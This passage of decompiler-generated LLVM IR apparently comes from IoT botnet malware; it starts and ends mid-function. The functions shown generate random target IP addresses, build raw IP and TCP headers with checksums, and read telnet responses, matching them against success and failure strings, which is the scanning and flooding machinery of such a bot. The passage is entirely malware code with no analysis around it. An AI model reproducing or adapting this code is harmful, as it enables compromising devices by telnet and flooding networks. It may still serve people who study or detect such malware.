  %v4_804c364 = zext i32 %v2_804c361 to i64
  %v5_804c364 = mul nuw i64 %v4_804c364, 4294967296
  %v6_804c364 = or i64 %v5_804c364, %v2_804c364
  %v10_804c364 = srem i64 %v6_804c364, 255
  %v11_804c364 = trunc i64 %v10_804c364 to i32
  store i32 %v11_804c364, i32* @eax, align 4
  %v1_804c368 = trunc i64 %v10_804c364 to i8
  store i8 %v1_804c368, i8* @global_var_805d499.29, align 1
  %v0_804c36d = call i32 @random()
  %v2_804c37d = ashr i32 %v0_804c36d, 31
  %v2_804c380 = zext i32 %v0_804c36d to i64
  %v4_804c380 = zext i32 %v2_804c37d to i64
  %v5_804c380 = mul nuw i64 %v4_804c380, 4294967296
  %v6_804c380 = or i64 %v5_804c380, %v2_804c380
  %v10_804c380 = srem i64 %v6_804c380, 255
  %v1_804c384 = trunc i64 %v10_804c380 to i8
  store i8 %v1_804c384, i8* @global_var_805d49a.30, align 2
  store i32 0, i32* %stack_var_-36, align 4
  %v0_804c3a5 = load i8, i8* @global_var_805d499.29, align 1
  %v1_804c3a5 = zext i8 %v0_804c3a5 to i32
  store i32 %v1_804c3a5, i32* @edx, align 4
  %v0_804c3bd = load i8, i8* @global_var_805d497.27, align 1
  %v1_804c3bd = zext i8 %v0_804c3bd to i32
  store i32 %v1_804c3bd, i32* @ebx, align 4
  %v0_804c3c9 = load i8, i8* @global_var_805d496.230, align 2
  %v1_804c3c9 = zext i8 %v0_804c3c9 to i32
  %v2_804c3d8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804c3d8, i32* @edi, align 4
  %v5_804c3e4 = call i32 @szprintf(i32 %v2_804c3d8, i32 ptrtoint ([12 x i8]* @global_var_8058fdd.231 to i32), i32 %v1_804c3c9, i32 %v1_804c3bd)
  %v1_804c3f3 = call i32 @inet_addr(i32 %v2_804c3d8)
  %v2_804c3fe = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804c3fe, i32* @ebx, align 4
  store i32 %v0_804c304, i32* @esi, align 4
  store i32 %v0_804c303, i32* @edi, align 4
  ret i32 %v1_804c3f3

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* @global_var_805d49a.30, { 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805d499.29, { 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805d498.28, { 2, 1, 0 }
  uselistorder i8* @global_var_805d497.27, { 3, 2, 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c409 = load i8*, i8** @global_var_8063708.232, align 4
  %v1_804c409 = ptrtoint i8* %v0_804c409 to i32
  %v2_804c412 = call i32 @ntohl(i32 %v1_804c409)
  %v5_804c41a = and i32 %v2_804c412, %arg1
  %v1_804c420 = call i32 @rand_cmwc(i32 %v5_804c41a)
  %v1_804c42a = sub i32 -1, %arg1
  %v2_804c42c = and i32 %v1_804c420, %v1_804c42a
  %v5_804c42e = xor i32 %v2_804c42c, %v5_804c41a
  ret i32 %v5_804c42e
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804c438 = load i32, i32* @ebx, align 4
  %v4_804c46c33 = add i32 %arg2, -1
  %v9_804c46c34 = sub i32 0, %arg2
  %v10_804c46c35 = and i32 %arg2, %v9_804c46c34
  %v11_804c46c36 = icmp slt i32 %v10_804c46c35, 0
  %v12_804c46c37 = icmp eq i32 %v4_804c46c33, 0
  %v13_804c46c38 = icmp slt i32 %v4_804c46c33, 0
  %v3_804c47039 = icmp eq i1 %v13_804c46c38, %v11_804c46c36
  %v4_804c47040 = icmp eq i1 %v12_804c46c37, false
  %v5_804c47041 = and i1 %v4_804c47040, %v3_804c47039
  br i1 %v5_804c47041, label %dec_label_pc_804c44c.lr.ph, label %dec_label_pc_804c472

dec_label_pc_804c44c.lr.ph:                       ; preds = %entry
  %v4_804c44f.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804c44c

dec_label_pc_804c44c:                             ; preds = %dec_label_pc_804c44c.lr.ph, %dec_label_pc_804c44c
  %v4_804c44f = phi i32 [ %v4_804c44f.pre, %dec_label_pc_804c44c.lr.ph ], [ %v6_804c44f, %dec_label_pc_804c44c ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_804c44c.lr.ph ], [ %v9_804c461, %dec_label_pc_804c44c ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_804c44c.lr.ph ], [ %v4_804c468, %dec_label_pc_804c44c ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_804c44c.lr.ph ], [ %v23_804c464, %dec_label_pc_804c44c ]
  %v3_804c45e42 = phi i32 [ 0, %dec_label_pc_804c44c.lr.ph ], [ %v6_804c45e, %dec_label_pc_804c44c ]
  %v4_804c44c = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804c44f = load i16, i16* %stack_var_4.043, align 2
  %v3_804c44f = zext i16 %v2_804c44f to i32
  %v5_804c44f = and i32 %v4_804c44f, -65536
  %v6_804c44f = or i32 %v5_804c44f, %v3_804c44f
  store i32 %v6_804c44f, i32* @ecx, align 4
  %sext51 = mul i32 %v3_804c45e42, 65536
  %v4_804c45e = sdiv i32 %sext51, 65536
  %v6_804c45e = add nsw i32 %v3_804c44f, %v4_804c45e
  %v11_804c45e = icmp ult i32 %v6_804c45e, %v4_804c45e
  %v26_804c45e = trunc i32 %v6_804c45e to i16
  %v7_804c461 = zext i1 %v11_804c45e to i16
  %v9_804c461 = add i16 %v7_804c461, %stack_var_-24.045
  %v5_804c464 = add i32 %v4_804c44c, 2
  %v23_804c464 = inttoptr i32 %v5_804c464 to i16*
  %v4_804c468 = add i32 %stack_var_8.044, -2
  %v4_804c46c = add i32 %stack_var_8.044, -3
  %v9_804c46c = sub i32 2, %stack_var_8.044
  %v10_804c46c = and i32 %v4_804c468, %v9_804c46c
  %v11_804c46c = icmp slt i32 %v10_804c46c, 0
  %v12_804c46c = icmp eq i32 %v4_804c46c, 0
  %v13_804c46c = icmp slt i32 %v4_804c46c, 0
  %v3_804c470 = icmp eq i1 %v13_804c46c, %v11_804c46c
  %v4_804c470 = icmp eq i1 %v12_804c46c, false
  %v5_804c470 = and i1 %v4_804c470, %v3_804c470
  br i1 %v5_804c470, label %dec_label_pc_804c44c, label %dec_label_pc_804c472

dec_label_pc_804c472:                             ; preds = %dec_label_pc_804c44c, %entry
  %v3_804c45e.lcssa = phi i16 [ 0, %entry ], [ %v26_804c45e, %dec_label_pc_804c44c ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804c464, %dec_label_pc_804c44c ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804c468, %dec_label_pc_804c44c ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804c461, %dec_label_pc_804c44c ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804c4b6.preheader, label %dec_label_pc_804c478

dec_label_pc_804c478:                             ; preds = %dec_label_pc_804c472
  %v1_804c47b = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804c47b = load i8, i8* %v1_804c47b, align 1
  %v3_804c47b = zext i8 %v2_804c47b to i32
  %v4_804c47b = load i32, i32* @ecx, align 4
  %v5_804c47b = and i32 %v4_804c47b, -256
  %v6_804c47b = or i32 %v5_804c47b, %v3_804c47b
  store i32 %v6_804c47b, i32* @ecx, align 4
  %v4_804c489 = sext i16 %v3_804c45e.lcssa to i32
  %v6_804c489 = add nsw i32 %v3_804c47b, %v4_804c489
  %v11_804c489 = icmp ult i32 %v6_804c489, %v4_804c489
  %v26_804c489 = trunc i32 %v6_804c489 to i16
  %v7_804c48c = zext i1 %v11_804c489 to i16
  %v9_804c48c = add i16 %v7_804c48c, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804c4b6.preheader

dec_label_pc_804c4b6.preheader:                   ; preds = %dec_label_pc_804c478, %dec_label_pc_804c472
  %v3_804c49b.ph = phi i16 [ %v3_804c45e.lcssa, %dec_label_pc_804c472 ], [ %v26_804c489, %dec_label_pc_804c478 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804c472 ], [ %v9_804c48c, %dec_label_pc_804c478 ]
  %v4_804c4b620 = sext i16 %v3_804c49b.ph to i32
  %v4_804c4b921 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804c4bc22 = udiv i32 %v4_804c4b620, 65536
  %v4_804c4bc23 = mul i32 %v4_804c4b921, 65536
  %v5_804c4bc24 = or i32 %v4_804c4bc23, %v3_804c4bc22
  %v2_804c4c025 = udiv i32 %v4_804c4b921, 65536
  %v2_804c4c326 = or i32 %v5_804c4bc24, %v2_804c4c025
  %v3_804c4c327 = icmp eq i32 %v2_804c4c326, 0
  %v1_804c4c728 = icmp eq i1 %v3_804c4c327, false
  br i1 %v1_804c4c728, label %dec_label_pc_804c491, label %dec_label_pc_804c4c9

dec_label_pc_804c491:                             ; preds = %dec_label_pc_804c4b6.preheader, %dec_label_pc_804c491
  %v2_804c4c031 = phi i32 [ %v2_804c4c0, %dec_label_pc_804c491 ], [ %v2_804c4c025, %dec_label_pc_804c4b6.preheader ]
  %v5_804c4bc30 = phi i32 [ %v5_804c4bc, %dec_label_pc_804c491 ], [ %v5_804c4bc24, %dec_label_pc_804c4b6.preheader ]
  %v4_804c4b629 = phi i32 [ %v4_804c4b6, %dec_label_pc_804c491 ], [ %v4_804c4b620, %dec_label_pc_804c4b6.preheader ]
  %v2_804c4ac = add i32 %v5_804c4bc30, %v4_804c4b629
  %v7_804c4ac = icmp ult i32 %v2_804c4ac, %v4_804c4b629
  %v3_804c4ae = zext i1 %v7_804c4ac to i32
  %v5_804c4ae = add nuw nsw i32 %v3_804c4ae, %v2_804c4c031
  %sext = mul i32 %v2_804c4ac, 65536
  %v4_804c4b6 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804c4ae, 65536
  %v4_804c4b9 = sdiv i32 %sext50, 65536
  %v3_804c4bc = udiv i32 %v4_804c4b6, 65536
  %v5_804c4bc = or i32 %sext50, %v3_804c4bc
  %v2_804c4c0 = udiv i32 %v4_804c4b9, 65536
  %v2_804c4c3 = or i32 %v5_804c4bc, %v2_804c4c0
  %v3_804c4c3 = icmp eq i32 %v2_804c4c3, 0
  %v1_804c4c7 = icmp eq i1 %v3_804c4c3, false
  br i1 %v1_804c4c7, label %dec_label_pc_804c491, label %dec_label_pc_804c4b6.dec_label_pc_804c4c9_crit_edge

dec_label_pc_804c4b6.dec_label_pc_804c4c9_crit_edge: ; preds = %dec_label_pc_804c491
  store i32 %v5_804c4bc30, i32* @ecx, align 4
  br label %dec_label_pc_804c4c9

dec_label_pc_804c4c9:                             ; preds = %dec_label_pc_804c4b6.dec_label_pc_804c4c9_crit_edge, %dec_label_pc_804c4b6.preheader
  %v4_804c4b6.lcssa = phi i32 [ %v4_804c4b6, %dec_label_pc_804c4b6.dec_label_pc_804c4c9_crit_edge ], [ %v4_804c4b620, %dec_label_pc_804c4b6.preheader ]
  %v1_804c4cc = urem i32 %v4_804c4b6.lcssa, 65536
  %v1_804c4ce = xor i32 %v1_804c4cc, 65535
  store i32 %v0_804c438, i32* @ebx, align 4
  ret i32 %v1_804c4ce

; uselistorder directives
  uselistorder i32 %v5_804c4bc, { 1, 0 }
  uselistorder i32 %v4_804c4b6, { 1, 0, 2 }
  uselistorder i32 %v2_804c4c025, { 1, 0 }
  uselistorder i32 %v4_804c4b921, { 1, 0 }
  uselistorder i32 %v4_804c4b620, { 2, 1, 0 }
  uselistorder i32 %v4_804c489, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804c45e.lcssa, { 1, 0 }
  uselistorder i32 %v4_804c46c, { 1, 0 }
  uselistorder i32 %v6_804c45e, { 1, 2, 0 }
  uselistorder i32 %v4_804c45e, { 1, 0 }
  uselistorder i32 %v6_804c44f, { 1, 0 }
  uselistorder label %dec_label_pc_804c491, { 1, 0 }
  uselistorder label %dec_label_pc_804c44c, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %v1_804c4ef = add i32 %tmp9, 12
  %v2_804c4ef = inttoptr i32 %v1_804c4ef to i32*
  %v3_804c4ef = load i32, i32* %v2_804c4ef, align 4
  %v1_804c4f8 = add i32 %tmp9, 16
  %v2_804c4f8 = inttoptr i32 %v1_804c4f8 to i32*
  %v3_804c4f8 = load i32, i32* %v2_804c4f8, align 4
  %v1_804c50b = call i32 @htons(i32 20)
  %v1_804c525 = call i32 @malloc(i32 32)
  store i32 %v1_804c525, i32* %ecx.global-to-local, align 4
  %v2_804c538 = inttoptr i32 %v1_804c525 to i32*
  store i32 %v3_804c4ef, i32* %v2_804c538, align 4
  %v1_804c53d = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c53d = add i32 %v1_804c53d, 4
  %v3_804c53d = inttoptr i32 %v2_804c53d to i32*
  store i32 %v3_804c4f8, i32* %v3_804c53d, align 4
  %v1_804c543 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c543 = add i32 %v1_804c543, 8
  %v3_804c543 = inttoptr i32 %v2_804c543 to i32*
  store i32 0, i32* %v3_804c543, align 4
  store i32 %tmp1, i32* @ecx, align 4
  %v1_804c54c = add i32 %v1_804c525, 12
  store i32 %v1_804c54c, i32* %edx.global-to-local, align 4
  %v1_804c54f = inttoptr i32 %tmp1 to i32*
  %v2_804c54f = load i32, i32* %v1_804c54f, align 4
  %v2_804c551 = inttoptr i32 %v1_804c54c to i32*
  store i32 %v2_804c54f, i32* %v2_804c551, align 4
  %v0_804c553 = load i32, i32* @ecx, align 4
  %v1_804c553 = add i32 %v0_804c553, 4
  %v2_804c553 = inttoptr i32 %v1_804c553 to i32*
  %v3_804c553 = load i32, i32* %v2_804c553, align 4
  %v1_804c556 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c556 = add i32 %v1_804c556, 4
  %v3_804c556 = inttoptr i32 %v2_804c556 to i32*
  store i32 %v3_804c553, i32* %v3_804c556, align 4
  %v0_804c559 = load i32, i32* @ecx, align 4
  %v1_804c559 = add i32 %v0_804c559, 8
  %v2_804c559 = inttoptr i32 %v1_804c559 to i32*
  %v3_804c559 = load i32, i32* %v2_804c559, align 4
  %v1_804c55c = load i32, i32* %edx.global-to-local, align 4
  %v2_804c55c = add i32 %v1_804c55c, 8
  %v3_804c55c = inttoptr i32 %v2_804c55c to i32*
  store i32 %v3_804c559, i32* %v3_804c55c, align 4
  %v0_804c55f = load i32, i32* @ecx, align 4
  %v1_804c55f = add i32 %v0_804c55f, 12
  %v2_804c55f = inttoptr i32 %v1_804c55f to i32*
  %v3_804c55f = load i32, i32* %v2_804c55f, align 4
  %v1_804c562 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c562 = add i32 %v1_804c562, 12
  %v3_804c562 = inttoptr i32 %v2_804c562 to i32*
  store i32 %v3_804c55f, i32* %v3_804c562, align 4
  %v0_804c565 = load i32, i32* @ecx, align 4
  %v1_804c565 = add i32 %v0_804c565, 16
  %v2_804c565 = inttoptr i32 %v1_804c565 to i32*
  %v3_804c565 = load i32, i32* %v2_804c565, align 4
  %v1_804c568 = load i32, i32* %edx.global-to-local, align 4
  %v2_804c568 = add i32 %v1_804c568, 16
  %v3_804c568 = inttoptr i32 %v2_804c568 to i32*
  store i32 %v3_804c565, i32* %v3_804c568, align 4
  %v2_804c571 = inttoptr i32 %v1_804c525 to i16*
  %v3_804c571 = call i32 @csum(i16* %v2_804c571, i32 32)
  %v1_804c583 = call i32 @free(i32 %v1_804c525)
  %v4_804c58b = urem i32 %v3_804c571, 65536
  ret i32 %v4_804c58b

; uselistorder directives
  uselistorder i32 %v1_804c525, { 2, 3, 4, 1, 0 }
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp1, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804c596 = load i32, i32* @ebp, align 4
  store i32 %v0_804c596, i32* %stack_var_-4, align 4
  %v4_804c59c = sext i8 %tmp8 to i32
  %v4_804c5a2 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804c5bf = add i32 %v4_804c5a2, 1
  %v2_804c5bf = inttoptr i32 %v1_804c5bf to i8*
  store i8 0, i8* %v2_804c5bf, align 1
  %v1_804c5c6 = add i32 %tmp5, 20
  %v1_804c5cc = trunc i32 %v1_804c5c6 to i16
  %v3_804c5cc = add i32 %v4_804c5a2, 2
  %v4_804c5cc = inttoptr i32 %v3_804c5cc to i16*
  store i16 %v1_804c5cc, i16* %v4_804c5cc, align 2
  %v2_804c5d0 = call i32 @rand_cmwc(i32 %v4_804c59c)
  %v1_804c5da = trunc i32 %v2_804c5d0 to i16
  %v3_804c5da = add i32 %v4_804c5a2, 4
  %v4_804c5da = inttoptr i32 %v3_804c5da to i16*
  store i16 %v1_804c5da, i16* %v4_804c5da, align 2
  %v1_804c5e1 = add i32 %v4_804c5a2, 6
  %v2_804c5e1 = inttoptr i32 %v1_804c5e1 to i16*
  store i16 0, i16* %v2_804c5e1, align 2
  %v1_804c5ea = add i32 %v4_804c5a2, 8
  %v2_804c5ea = inttoptr i32 %v1_804c5ea to i8*
  store i8 -1, i8* %v2_804c5ea, align 1
  %v3_804c5f4 = add i32 %v4_804c5a2, 9
  %v4_804c5f4 = inttoptr i32 %v3_804c5f4 to i8*
  store i8 %tmp8, i8* %v4_804c5f4, align 1
  %v1_804c5fa = add i32 %v4_804c5a2, 10
  %v2_804c5fa = inttoptr i32 %v1_804c5fa to i16*
  store i16 0, i16* %v2_804c5fa, align 2
  %v2_804c606 = add i32 %v4_804c5a2, 12
  %v3_804c606 = inttoptr i32 %v2_804c606 to i32*
  %v2_804c60f = add i32 %v4_804c5a2, 16
  %v3_804c60f = inttoptr i32 %v2_804c60f to i32*
  store i32 %tmp, i32* %v3_804c60f, align 4
  %v2_804c612 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c612, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 2, 0, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804c614 = load i32, i32* @ebp, align 4
  store i32 %v0_804c614, i32* %stack_var_-4, align 4
  %v4_804c61a = add i32 %arg1, -2
  %v9_804c61a = sub i32 1, %arg1
  %v10_804c61a = and i32 %v9_804c61a, %arg1
  %v11_804c61a = icmp slt i32 %v10_804c61a, 0
  %v12_804c61a = icmp eq i32 %v4_804c61a, 0
  %v13_804c61a = icmp slt i32 %v4_804c61a, 0
  %v3_804c61e = icmp eq i1 %v13_804c61a, %v11_804c61a
  %v4_804c61e = icmp eq i1 %v12_804c61a, false
  %v5_804c61e = and i1 %v4_804c61e, %v3_804c61e
  br i1 %v5_804c61e, label %dec_label_pc_804c629, label %dec_label_pc_804c63e

dec_label_pc_804c629:                             ; preds = %entry
  %v1_804c62f = call i32 @__libc_close(i32 %arg1)
  %v2_804c641.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804c63e

dec_label_pc_804c63e:                             ; preds = %entry, %dec_label_pc_804c629
  %v2_804c641 = phi i32 [ %v2_804c641.pre, %dec_label_pc_804c629 ], [ %v0_804c614, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804c629 ], [ 1, %entry ]
  store i32 %v2_804c641, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804c61a, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804c63e, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v1_804c64c = add i32 %tmp1, 4
  %v2_804c64c = inttoptr i32 %v1_804c64c to i32*
  %v3_804c64c = load i32, i32* %v2_804c64c, align 4
  %v1_804c658 = call i32 @__GI_inet_ntoa(i32 %v3_804c64c)
  ret i32 %v1_804c658
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804c665 = load i32, i32* @edi, align 4
  store i32 %v0_804c665, i32* %stack_var_-8, align 4
  %v1_804c66f = inttoptr i32 %tmp4 to i8*
  store i32 %tmp4, i32* @edi, align 4
  %v1_804c674 = and i32 %tmp4, -256
  %v5_804c676 = call i8* @_memset(i8* %v1_804c66f, i32 %v1_804c674, i32 %tmp5)
  %v4_804c684 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp3, i32 %tmp4, i32 %tmp5)
  %v2_804c698 = inttoptr i32 %tmp to i32*
  %v3_804c698 = call i32 @contains_string(i32 %tmp4, i32* %v2_804c698)
  %v1_804c6a0 = icmp ne i32 %v3_804c698, 0
  %storemerge = zext i1 %v1_804c6a0 to i32
  %v3_804c6b7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804c6b7, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp4, { 4, 0, 1, 3, 2 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804c6e3 = ptrtoint i32* %stack_var_-144 to i32
  %tmp21 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_804c6ea = call i8* @_memset(i8* %tmp21, i32 0, i32 32)
  %v2_804c6f7 = udiv i32 %arg1, 32
  %v1_804c6fd = urem i32 %arg1, 32
  %v0_804c700 = load i32, i32* @ebp, align 4
  %v2_804c700 = mul nuw nsw i32 %v2_804c6f7, 4
  %v3_804c700 = add nsw i32 %v2_804c700, -140
  %v4_804c700 = add i32 %v3_804c700, %v0_804c700
  %v5_804c700 = inttoptr i32 %v4_804c700 to i32*
  %v6_804c700 = load i32, i32* %v5_804c700, align 4
  %v9_804c700 = shl i32 1, %v1_804c6fd
  %v12_804c700 = or i32 %v6_804c700, %v9_804c700
  store i32 %v12_804c700, i32* %v5_804c700, align 4
  %v1_804c70b = add i32 %arg1, 1
  %v2_804c70f = ptrtoint i32* %stack_var_-152 to i32
  %v5_804c722 = call i32 @__libc_select(i32 %v1_804c70b, i32 %v2_804c6e3, i32 0, i32 0, i32 %v2_804c70f)
  %tmp22 = icmp slt i32 %v5_804c722, 1
  %tmp23 = icmp eq i1 %tmp22, false
  br i1 %tmp23, label %dec_label_pc_804c73a, label %dec_label_pc_804c754

dec_label_pc_804c73a:                             ; preds = %entry
  %v4_804c746 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_804c754

dec_label_pc_804c754:                             ; preds = %entry, %dec_label_pc_804c73a
  %storemerge = phi i32 [ %v4_804c746, %dec_label_pc_804c73a ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804c754, { 1, 0 }
}

define i32 @contains_success() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v4_804c770 = call i32 @contains_string(i32 %tmp, i32* bitcast ([3 x i8*]* @global_var_805d0a0.236 to i32*))
  ret i32 %v4_804c770
}

define i32 @contains_fail() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v4_804c78b = call i32 @contains_string(i32 %tmp, i32* bitcast ([7 x i8*]* @global_var_805d080.244 to i32*))
  ret i32 %v4_804c78b
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804c795 = load i32, i32* @ebp, align 4
  store i32 %v0_804c795, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804c7b0

dec_label_pc_804c7b0:                             ; preds = %dec_label_pc_804c7b0, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804c7b0, %dec_label_pc_804c7b0 ]
  %v4_804c7b0 = add i32 %stack_var_-12.0, 1
  %v2_804c7b6 = mul i32 %v4_804c7b0, 4
  %v5_804c7b9 = add i32 %v2_804c7b6, %tmp5
  %v1_804c7bc = inttoptr i32 %v5_804c7b9 to i32*
  %v2_804c7bc = load i32, i32* %v1_804c7bc, align 4
  %v1_804c7be = icmp eq i32 %v2_804c7bc, 0
  %v1_804c7c0 = icmp eq i1 %v1_804c7be, false
  br i1 %v1_804c7c0, label %dec_label_pc_804c7b0, label %dec_label_pc_804c7f5.preheader

dec_label_pc_804c7f5.preheader:                   ; preds = %dec_label_pc_804c7b0
  %v2_804c7dd = inttoptr i32 %arg1 to i8*
  %v5_804c7fb16 = icmp sgt i32 %v4_804c7b0, 0
  br i1 %v5_804c7fb16, label %dec_label_pc_804c7cb.lr.ph, label %dec_label_pc_804c804

dec_label_pc_804c7cb.lr.ph:                       ; preds = %dec_label_pc_804c7f5.preheader
  br label %dec_label_pc_804c7cb

dec_label_pc_804c7cb:                             ; preds = %dec_label_pc_804c7cb.lr.ph, %dec_label_pc_804c7f2
  %storemerge117 = phi i32 [ 0, %dec_label_pc_804c7cb.lr.ph ], [ %v4_804c7f2, %dec_label_pc_804c7f2 ]
  %v2_804c7ce = mul i32 %storemerge117, 4
  %v5_804c7d1 = add i32 %v2_804c7ce, %tmp5
  %v1_804c7d4 = inttoptr i32 %v5_804c7d1 to i32*
  %v2_804c7d4 = load i32, i32* %v1_804c7d4, align 4
  store i32 %v2_804c7d4, i32* @eax, align 4
  %v3_804c7dd = call i32 @strcasestr(i8* %v2_804c7dd, i32 %v2_804c7d4)
  %v1_804c7e5 = icmp eq i32 %v3_804c7dd, 0
  br i1 %v1_804c7e5, label %dec_label_pc_804c7f2, label %dec_label_pc_804c804

dec_label_pc_804c7f2:                             ; preds = %dec_label_pc_804c7cb
  %v4_804c7f2 = add nuw nsw i32 %storemerge117, 1
  %v5_804c7fb = icmp slt i32 %v4_804c7f2, %v4_804c7b0
  br i1 %v5_804c7fb, label %dec_label_pc_804c7cb, label %dec_label_pc_804c804

